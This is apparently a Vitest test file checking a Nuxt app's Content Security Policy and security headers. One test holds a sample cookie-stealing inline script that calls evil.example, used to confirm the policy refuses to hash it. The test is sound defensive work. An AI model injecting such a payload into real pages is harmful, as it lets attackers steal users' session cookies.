import { createHash } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import { UMAMI_ORIGIN } from '../../shared/analytics'
import { contentSecurityPolicy } from '../../server/security/csp'
import { withSecurityHeaders } from '../../server/security/headers'

const sha = (s: string) => `'sha256-${createHash('sha256').update(s).digest('base64')}'`
const parts = (p: { head?: string[]; bodyPrepend?: string[]; bodyAppend?: string[] }) => ({
  head: p.head ?? [],
  bodyPrepend: p.bodyPrepend ?? [],
  bodyAppend: p.bodyAppend ?? [],
})

const IMPORT_MAP = '{"imports":{"#entry":"/_nuxt/entry.js"}}'
const PAYLOAD = 'window.__NUXT__={};window.__NUXT__.config={public:{}}'

describe('contentSecurityPolicy', () => {
  it('allows only self and the Umami host, and nothing else external', async () => {
    const csp = await contentSecurityPolicy(parts({}))
    expect(csp).toContain("default-src 'self'")
    expect(csp).toContain(`script-src 'self' ${UMAMI_ORIGIN};`)
    expect(csp).toContain(`connect-src 'self' ${UMAMI_ORIGIN};`)
    expect(csp).toContain("font-src 'self'")
    expect(csp).toContain("frame-ancestors 'none'")
    expect(csp).toContain("object-src 'none'")
    expect(csp.match(/https?:\/\/[^\s;]+/g)).toEqual([UMAMI_ORIGIN, UMAMI_ORIGIN])
    expect(csp).not.toContain('unsafe-eval')
    expect(csp).not.toMatch(/script-src[^;]*unsafe-inline/)
  })

  it('hashes the Nuxt import map and payload script', async () => {
    const csp = await contentSecurityPolicy(
      parts({
        head: [`<script type="importmap">${IMPORT_MAP}</script>`, '<script type="module" src="/_nuxt/a.js"></script>'],
        bodyAppend: [`<script>${PAYLOAD}</script>`],
      }),
    )
    expect(csp).toContain(`script-src 'self' ${UMAMI_ORIGIN} ${sha(IMPORT_MAP)} ${sha(PAYLOAD)};`)
  })

  it('does not hash an arbitrary inline script, even in a framework part', async () => {
    const evil = 'fetch("//evil.example/?c="+document.cookie)'
    const csp = await contentSecurityPolicy(
      parts({
        head: [`<script type="importmap">${IMPORT_MAP}</script>`, `<script>${evil}</script>`],
        bodyAppend: [`<script>${PAYLOAD}</script>`, `<script type="module">${evil}</script>`],
      }),
    )
    expect(csp).not.toContain(sha(evil))
    expect(csp).toContain(sha(IMPORT_MAP))
    expect(csp).toContain(sha(PAYLOAD))
  })

  it('ignores JSON data scripts', async () => {
    const csp = await contentSecurityPolicy(parts({ bodyAppend: ['<script type="application/json" id="__NUXT_DATA__">[1]</script>'] }))
    expect(csp).toContain(`script-src 'self' ${UMAMI_ORIGIN};`)
  })
})

describe('withSecurityHeaders', () => {
  it('adds the security headers and a deny-all CSP and keeps status and body', async () => {
    const response = withSecurityHeaders(new Response('{"ok":true}', { status: 202, headers: { 'content-type': 'application/json' } }))
    expect(response.status).toBe(202)
    expect(await response.text()).toBe('{"ok":true}')
    expect(response.headers.get('content-type')).toBe('application/json')
    expect(response.headers.get('content-security-policy')).toBe("default-src 'none'; frame-ancestors 'none'")
    expect(response.headers.get('x-content-type-options')).toBe('nosniff')
    expect(response.headers.get('x-frame-options')).toBe('DENY')
    expect(response.headers.get('strict-transport-security')).toContain('max-age=31536000')
    expect(response.headers.get('referrer-policy')).toBe('strict-origin-when-cross-origin')
    expect(response.headers.get('permissions-policy')).toContain('camera=()')
  })
})
